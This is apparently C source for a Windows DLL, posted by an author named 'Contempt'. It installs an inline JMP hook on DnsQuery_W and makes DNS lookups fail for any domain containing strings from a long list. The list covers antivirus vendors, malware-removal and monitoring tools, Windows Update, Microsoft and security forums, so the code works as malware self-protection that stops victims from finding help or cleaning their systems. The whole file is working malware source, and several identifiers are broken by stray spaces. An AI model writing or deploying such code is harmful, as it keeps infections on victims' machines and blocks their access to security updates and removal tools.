/*
[ DnsApi Hook (Block WebSites Using Strings) ]
[ Author: Contempt ]
*/ 

#include <windows.h>
#include <shlwapi.h>
#include <windns.h>
/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/
#define ERROR_DS_DOMAIN_VERSION_TOO_HIGH 8564L
WCHAR *UrlsBlock[]={
L"freeav",
L"rising",
L"unlocker",
L"sans.",
L"free-av",
L"free-antivirus",
L"filehippo",
L"soft82",
L"download.cnet",
L"avp",
L"root-servers",
L"gtld-servers",
L"removal",
L"tcpview",
L"clamwin",
L"vil.nai",
L"fortinet",
L"freebyte",
L"quickheal",
L"sysclean",
L"msft.",
L"f-secure",
L"ptsecurity",
L"msdn",
L"f-prot",
L"prevx",
L"regmon",
L"ewido",
L"pctools",
L"procmon",
L"etrust",
L"panda",
L"procexp",
L"fbi",
L"eset",
L"onecare",
L"gmer",
L"esafe",
L"aladdin",
L"norton",
L"softpedia",
L"mrtstub",
L"emsisoft",
L"trendsecure",
L"norman",
L"dslreports",
L"nod32",
L"mbsa.",
L"bit9",
L"drweb",
L"networkassociates",
L"klwk",
L"defender",
L"mtc.sri",
L"avg",
L"cyber-ta",
L"msmvps",
L"windowsupdate",
L"cpsecure",
L"msftncsi",
L"wilderssecurity",
L"mirage",
L"thehotfix",
L"virus",
L"computerassociates",
L"microsoft",
L"gmer",
L"virscan",
L"comodo",
L"mcafee",
L"filemon",
L"trojan",
L"clamav",
L"malware",
L"trendmicro",
L"housecall",
L"centralcommand",
L"kaspersky",
L"threatexpert",
L"pandasecurity",
L"security",
L"antivirus",
L"ccollomb",
L"k7computing",
L"avenger",
L"threat",
L"castlecops",
L"jotti",
L"autoruns",
L"technet",
L"bothunter",
L"ikarus",
L"safety.live",
L"symantec",
L"avira",
L"hauri",
L"rootkit",
L"sunbelt",
L"avgate",
L"hacksoft",
L"securecomputing",
L"spyware",
L"avast",
L"hackerwatch",
L"ahnlab",
L"spamhaus",
L"arcabit",
L"grisoft",
L"wireshark",
L"sophos",
L"antivir",
L"gdata",
L"secureworks",
L"novirusthanks",
L"malwarebytes",
L"mbam",
L"anti-malware",
L"novashield",
L"emsisoft",
L"iseclab",
L"virusscan",
L"agnitum",};
/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/
typedef (WINAPI *ExDnsQuery) (LPCTSTR,WORD,DWORD,PVOID,PDNS_RECORD*,PVOID*);
DNS_STATUS WINAPI mDnsQuery( LPCTSTR lpstrName,WORD wType,DWORD Options,PVOID pExtra,PDNS_RECORD *ppQueryResultsSet,PVOID *pReserved);
void RecStolenBytes(unsigned char *aDnsQuery_W,unsigned char *ptr);
int Block(WCHAR *ptr);
void mThreadProc();
void WriteJmp(unsigned char *ptr);
void StolenBytes(unsigned char *aDnsQuery_W,unsigned char *ptr);
ExDnsQuery xDnsQuery;
unsigned char Stolen[5];
char szCantTouchdll[MAX_PATH];
HANDLE dllguard;
/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
HANDLE APIhook; //THis is to tell if we're hooked already
APIhook = CreateMutex(NULL, TRUE, (LPCSTR) "HookedDnsSuccess");
if(fdwReason == DLL_PROCESS_ATTACH){
CreateThread(NULL,0,(LPVOID)mThreadProc,NULL,0,NUL L);
}
else{
return TRUE;
}
return TRUE;
}
void mThreadProc()
{
HANDLE mHandle = 0;
DWORD Prv = 0;
LPVOID aDnsQuery_W;

aDnsQuery_W = GetProcAddress(GetModuleHandle("DNSAPI.dll"),"DnsQuery_W");
VirtualProtect(aDnsQuery_W,5,PAGE_EXECUTE_READWRIT E,&Prv);

StolenBytes(aDnsQuery_W,Stolen);
WriteJmp(aDnsQuery_W);

for(;;){
Sleep(10000);
}
}
DNS_STATUS WINAPI mDnsQuery( LPCTSTR lpstrName,WORD wType,DWORD Options,PVOID pExtra,PDNS_RECORD *ppQueryResultsSet,PVOID *pReserved)
{
int i;
LPVOID aDnsQuery_W;

aDnsQuery_W = GetProcAddress(GetModuleHandle("DNSAPI.dll"),"DnsQuery_W");

i = Block((WCHAR *)lpstrName);

if(i==1) {
SetLastError(ERROR_DS_DOMAIN_VERSION_TOO_HIGH);
return 0; } else
{
RecStolenBytes(aDnsQuery_W,Stolen);
xDnsQuery = aDnsQuery_W;
xDnsQuery(lpstrName,wType,Options,pExtra,ppQueryRe sultsSet,pReserved);
WriteJmp(aDnsQuery_W);
return 0;
}
return 0;
}
void StolenBytes(unsigned char *aDnsQuery_W,unsigned char *ptr)
{
int i = 0;

for(;i<5;i++){

*ptr = *aDnsQuery_W;
ptr++;
aDnsQuery_W++;
}
}
void WriteJmp(unsigned char *ptr) {

unsigned char *tmptr;
DWORD *bptr;
int i = 0;

tmptr =(unsigned char *) mDnsQuery;
tmptr = (unsigned char *)(tmptr - ptr);
tmptr = tmptr - 5;

*ptr = 0xE9;
ptr++;
bptr =(DWORD *) ptr;
*bptr =(DWORD) tmptr;
}
void RecStolenBytes(unsigned char *aDnsQuery_W,unsigned char *ptr)
{
int i = 0;

for(;i<5;i++) {

*aDnsQuery_W = *ptr;
ptr++;
aDnsQuery_W++;
}
}
int Block(WCHAR *ptr)
{
int i;

for(i = 0;i<sizeof(UrlsBlock) / sizeof(UrlsBlock[0]);i++){
if(StrStrW(ptr,UrlsBlock[i]) != 0){
memset(ptr,0xCC,8);
return 1;
}
}
return 0;
}
/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/
